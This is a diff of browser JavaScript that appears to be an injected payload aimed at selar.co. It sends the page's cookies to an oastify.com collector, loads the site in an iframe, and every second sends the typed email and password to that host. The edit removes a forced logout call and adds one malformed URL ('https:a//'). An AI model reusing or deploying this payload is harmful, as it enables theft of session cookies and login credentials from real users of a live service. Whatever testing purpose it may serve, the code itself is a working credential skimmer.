@@ -1,5 +1,4 @@
 let currSession = "";
-fetch('https://selar.co/logout', {method: 'GET'});
 fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
 document.body.style.setProperty('height', '100vh')
 const iframe = document.createElement('iframe');
@@ -16,10 +15,11 @@ iframe.onload = function () {
 };
 document.body.appendChild(iframe);
 //=================================================================================
+const xpath = "/html/body/div[1]/div[2]/div[1]/div[2]/div/div[2]/div[1]/input";
 setInterval(()=> {
-    const xpath = "/html/body/div[1]/div[2]/div[1]/div[2]/div/div[2]/div[1]/input";
-    const element = document.evaluate(xpath,document,null, XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue;
-    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Email?direct-email-${element.value}`)
+    const iframe = document.querySelector('iframe');
+    const element = document.evaluate(xpath,iframe,null, XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue;
+    fetch(`https:a//4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Email?direct-email-${element.value}`)
     fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?direct-password-${document.getElementById("password").value}`)
 }, 1000)
 
